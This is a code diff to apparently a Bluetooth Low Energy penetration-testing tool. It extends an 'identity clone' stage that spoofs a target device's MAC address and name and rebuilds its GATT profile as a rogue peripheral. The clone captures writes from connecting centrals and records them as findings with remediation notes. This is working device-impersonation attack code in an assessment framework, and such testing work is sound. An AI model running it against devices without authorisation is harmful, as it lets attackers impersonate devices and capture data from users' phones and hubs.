@@ -9,12 +9,13 @@ from whad.ble.profile import (
     PrimaryService,
     Characteristic,
 )
+from whad.ble.profile.advdata import AdvDataFieldList, AdvFlagsField, AdvCompleteLocalName
 from whad.device import WhadDevice
 
 from core.dongle import WhadDongle
 from core.models import Target, Finding
 from core.db import insert_finding
-from core.logger import get_logger
+from core.logger import get_logger, prompt_line
 from core.pcap import pcap_path, attach_monitor, detach_monitor
 import config
 
@@ -162,15 +163,42 @@ def run(
             return
         log.info("[S3-spawn] Falling back to static clone mode.")
 
+    # --- Operator customisation prompts ---
+    default_name = target.name or "Unknown"
+    raw = prompt_line(f"Advertise name [{default_name}]: ")
+    clone_name = (raw or "").strip() or default_name
+
+    default_addr = target.bd_address
+    raw = prompt_line(f"Spoof MAC address [{default_addr}]: ")
+    clone_addr = (raw or "").strip() or default_addr
+
+    raw = prompt_line(f"Advertise duration in seconds [{CLONE_DURATION}]: ")
+    try:
+        clone_duration = int((raw or "").strip())
+        if clone_duration <= 0:
+            raise ValueError
+    except ValueError:
+        clone_duration = CLONE_DURATION
+
+    log.info(
+        f"[S3] Clone config — name={clone_name!r}  addr={clone_addr}  "
+        f"duration={clone_duration}s"
+    )
+
     if gatt_profile:
         log.info(
             f"[S3] Full GATT profile available ({len(gatt_profile)} chars) — "
             "building faithful clone."
         )
-        profile = _build_full_clone_profile(target, gatt_profile)
+        profile = _build_full_clone_profile(target, gatt_profile, clone_name)
     else:
-        profile = _build_clone_profile(target)
-    adv_data = _build_adv_data(target)
+        profile = _build_clone_profile(target, clone_name)
+
+    # Build adv data with the operator-chosen name
+    adv_data = AdvDataFieldList(
+        AdvFlagsField(),
+        AdvCompleteLocalName(clone_name.encode("utf-8", errors="replace")),
+    )
 
     written_log: list[dict] = []
     _attach_write_hooks(profile, written_log)
@@ -182,12 +210,12 @@ def run(
 
     if dongle.caps.can_spoof_bd_addr:
         try:
-            periph.set_bd_address(target.bd_address)
-            log.info(f"BD address spoofed to {target.bd_address}")
+            periph.set_bd_address(clone_addr)
+            log.info(f"BD address spoofed to {clone_addr}")
         except Exception as exc:
             log.warning(
                 f"BD address spoofing failed at runtime: {exc}. "
-                f"Proceeding with native address."
+                "Proceeding with native address."
             )
     else:
         log.warning(
@@ -195,12 +223,11 @@ def run(
             "clone will advertise from native address."
         )
 
-    if adv_data:
-        try:
-            periph.enable_adv_mode(adv_data=adv_data)
-            log.info("Advertising data configured from captured records")
-        except Exception as exc:
-            log.debug(f"enable_adv_mode failed: {exc}")
+    try:
+        periph.enable_adv_mode(adv_data=adv_data)
+        log.info(f"Advertising as {clone_name!r}")
+    except Exception as exc:
+        log.debug(f"enable_adv_mode failed: {exc}")
 
     connections_received: list[dict] = []
     stop_event = threading.Event()
@@ -214,7 +241,6 @@ def run(
             {
                 "conn_handle": conn_handle,
                 "connected_at": now.isoformat(),
-                # legacy key for summary display
                 "timestamp": now.isoformat(),
             }
         )
@@ -247,14 +273,14 @@ def run(
         log.debug(f"[S3] on_disconnect hook not supported: {exc}")
 
     log.info(
-        f"Starting rogue peripheral for {CLONE_DURATION}s. "
-        f"Advertising as {target.bd_address}..."
+        f"Starting rogue peripheral for {clone_duration}s. "
+        f"Advertising as {clone_addr} / {clone_name!r}..."
     )
 
     periph.start()
 
     try:
-        deadline = time() + CLONE_DURATION
+        deadline = time() + clone_duration
         while time() < deadline and not stop_event.is_set():
             sleep(1.0)
     except KeyboardInterrupt:
@@ -278,9 +304,9 @@ def run(
         target_addr=target.bd_address,
         description=(
             f"Rogue peripheral cloned {target.bd_address} "
-            f"({target.name or 'unnamed'}). "
+            f"({target.name or 'unnamed'}) as {clone_name!r} / {clone_addr}. "
             f"{len(connections_received)} central(s) connected "
-            f"to the clone during {CLONE_DURATION}s test window."
+            f"to the clone during {clone_duration}s test window."
             f"{write_detail}"
         ),
         remediation=(
@@ -291,13 +317,15 @@ def run(
         ),
         evidence={
             "cloned_addr": target.bd_address,
+            "spoofed_addr": clone_addr,
             "cloned_name": target.name,
+            "spoofed_name": clone_name,
             "device_class": target.device_class,
             "connections_received": connections_received,
             "total_dwell_seconds": sum(
                 s.get("dwell_seconds", 0) for s in connections_received
             ),
-            "duration_seconds": CLONE_DURATION,
+            "duration_seconds": clone_duration,
             "writes_captured": written_log,
         },
         pcap_path=str(_pcap),
@@ -311,12 +339,13 @@ def run(
         f"{len(connections_received)} connection(s)"
     )
 
-    _print_summary(target, connections_received)
+    _print_summary(target, connections_received, clone_name, clone_addr, clone_duration)
 
 
 def _build_full_clone_profile(
     target: Target,
     gatt_profile: list[dict],
+    clone_name: str,
 ) -> GenericProfile:
     """Build a GenericProfile faithfully reconstructed from a captured GATT profile.
 
@@ -373,20 +402,25 @@ def _build_full_clone_profile(
 
         return Characteristic(uuid=uuid_obj, permissions=perms, value=value)
 
-    # Build 0x1800 service for standard characteristics
+    # Build 0x1800 service for standard characteristics.
+    # Override 0x2A00 (Device Name) with the operator-chosen clone_name.
     if standard:
         svc = PrimaryService(uuid=UUID(0x1800))
         for c in standard:
             try:
-                svc.add(_make_char(c))
+                char = _make_char(c)
+                uuid_int = int(c["uuid"].replace("-", ""), 16)
+                if uuid_int == 0x2A00:
+                    char = Characteristic(uuid=UUID(0x2A00), permissions=["read"],
+                                          value=clone_name.encode("utf-8"))
+                svc.add_characteristic(char)
             except Exception as exc:
                 log.debug(f"Could not add standard char {c['uuid']}: {exc}")
         profile.add_service(svc)
     else:
         # Always include at least a minimal 0x1800 service
         svc = PrimaryService(uuid=UUID(0x1800))
-        name_val = (target.name or "Unknown").encode("utf-8")
-        svc.add(Characteristic(uuid=UUID(0x2A00), permissions=["read"], value=name_val))
+        svc.add_characteristic(Characteristic(uuid=UUID(0x2A00), permissions=["read"], value=clone_name.encode("utf-8")))
         profile.add_service(svc)
 
     # Build proprietary service(s)
@@ -413,7 +447,7 @@ def _build_full_clone_profile(
         prop_svc = PrimaryService(uuid=prop_svc_uuid)
         for c in proprietary:
             try:
-                prop_svc.add(_make_char(c))
+                prop_svc.add_characteristic(_make_char(c))
             except Exception as exc:
                 log.debug(f"Could not add proprietary char {c['uuid']}: {exc}")
         profile.add_service(prop_svc)
@@ -421,19 +455,18 @@ def _build_full_clone_profile(
     return profile
 
 
-def _build_clone_profile(target: Target) -> GenericProfile:
+def _build_clone_profile(target: Target, clone_name: str) -> GenericProfile:
     profile = GenericProfile()
 
     svc = PrimaryService(uuid=UUID(0x1800))
-    name_val = (target.name or "Unknown").encode("utf-8")
-    svc.add(
+    svc.add_characteristic(
         Characteristic(
             uuid=UUID(0x2A00),
             permissions=["read"],
-            value=name_val,
+            value=clone_name.encode("utf-8"),
         )
     )
-    svc.add(
+    svc.add_characteristic(
         Characteristic(
             uuid=UUID(0x2A01),
             permissions=["read"],
@@ -453,7 +486,7 @@ def _build_clone_profile(target: Target) -> GenericProfile:
                 continue
 
             custom_svc = PrimaryService(uuid=uuid_obj)
-            custom_svc.add(
+            custom_svc.add_characteristic(
                 Characteristic(
                     uuid=UUID(uuid_obj.value + 1)
                     if isinstance(uuid_obj.value, int)
@@ -469,22 +502,22 @@ def _build_clone_profile(target: Target) -> GenericProfile:
     return profile
 
 
-def _build_adv_data(target: Target) -> bytes:
-    if target.raw_adv_records:
-        return target.raw_adv_records[0]
-    return b""
-
-
 def _print_summary(
-    target: Target, connections: list[dict]
+    target: Target,
+    connections: list[dict],
+    clone_name: str,
+    clone_addr: str,
+    clone_duration: int,
 ) -> None:
     log.info("\n" + "─" * 76)
     log.info("  STAGE 3 SUMMARY -- Identity Clone")
     log.info("─" * 76)
-    log.info(f"  {'Cloned device':<18}: {target.bd_address}")
-    log.info(f"  {'Device name':<18}: {target.name or '(unnamed)'}")
+    log.info(f"  {'Real device':<18}: {target.bd_address}")
+    log.info(f"  {'Real name':<18}: {target.name or '(unnamed)'}")
     log.info(f"  {'Device class':<18}: {target.device_class}")
-    log.info(f"  {'Clone duration':<18}: {CLONE_DURATION}s")
+    log.info(f"  {'Spoofed MAC':<18}: {clone_addr}")
+    log.info(f"  {'Spoofed name':<18}: {clone_name}")
+    log.info(f"  {'Clone duration':<18}: {clone_duration}s")
     log.info(f"  {'Centrals duped':<18}: {len(connections)}")
     if connections:
         for i, c in enumerate(connections):
